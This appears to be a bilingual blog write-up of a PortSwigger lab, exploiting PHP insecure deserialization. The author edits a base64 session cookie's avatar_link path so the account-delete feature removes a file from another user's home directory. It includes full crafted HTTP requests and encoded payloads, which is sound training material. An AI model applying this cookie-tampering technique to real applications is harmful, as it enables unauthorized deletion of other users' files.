---
layout: post
title: "Using application functionality to exploit insecure deserialization"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---





# Using application functionality to exploit insecure deserialization

```

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

You also have access to a backup account: `gregg:rosebud`




本實驗使用基於序列化的會話機制。 某個功能對序列化對像中提供的數據調用危險方法。 為了解決這個實驗，編輯會話 cookie 中的序列化對象並使用它從 Carlos 的主目錄中刪除 `morale.txt` 文件。

您可以使用以下憑據登錄到您自己的帳戶：`wiener:peter`

您還可以訪問備份帳戶：`gregg:rosebud`

```



```http

POST /my-account/delete HTTP/1.1
Host: 0a1200be038183d1c0902444003000b7.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwdGk5cDdmaDl0bDl4azd1Y3Jkc3U4Y25zbjl5eXEwMCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: https://0a1200be038183d1c0902444003000b7.web-security-academy.net
Referer: https://0a1200be038183d1c0902444003000b7.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close



```



cookie base64 decode
```

O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pti9p7fh9tl9xk7ucrdsu8cnsn9yyq00";s:11:"avatar_link";s:19:"users/wiener/avatar";}

```

Unserialize
```
__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] => User
    [username] => wiener
    [access_token] => pti9p7fh9tl9xk7ucrdsu8cnsn9yyq00
    [avatar_link] => users/wiener/avatar
)
```



修改

```
O:4:"User":3:{s:8:"username";s:6:"Carlos";s:12:"access_token";i:0;s:11:"avatar_link";s:23:"users/Carlos/morale.txt";}

```



Unserialize
```
__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] => User
    [username] => Carlos
    [access_token] => 0
    [avatar_link] => users/Carlos/morale.txt
)

```


base64 encode
```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IkNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL0Nhcmxvcy9tb3JhbGUudHh0Ijt9

```



```http

POST /my-account/delete HTTP/1.1
Host: 0a1200be038183d1c0902444003000b7.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IkNhcmxvcyI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6InVzZXJzL0Nhcmxvcy9tb3JhbGUudHh0Ijt9
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: https://0a1200be038183d1c0902444003000b7.web-security-academy.net
Referer: https://0a1200be038183d1c0902444003000b7.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close



```


失敗。我這邊測試時，不小心把wiener 給刪除了。

登入backup帳號。`gregg:rosebud`

測試 upload image 那裏

有上傳圖片可以成功。


沒上傳會長這樣
```
PHP Fatal error:  Uncaught Exception: Error in file upload: 4 in /home/carlos/avatar_upload.php:6
Stack trace:
#0 {main}
  thrown in /home/carlos/avatar_upload.php on line 6

```

我們知道了
```
/home/carlos/
```

把它改成
```
/home/carlos/morale.txt
```


這次 access_token 不改為0
```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ckukwdg3gy38s05vcfs5wf6g4iojnmwe";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

base64 encode
```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImNrdWt3ZGczZ3kzOHMwNXZjZnM1d2Y2ZzRpb2pubXdlIjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
```


此時拿去提交後，可以成功，但帳號跟著 txt一起刪掉了。





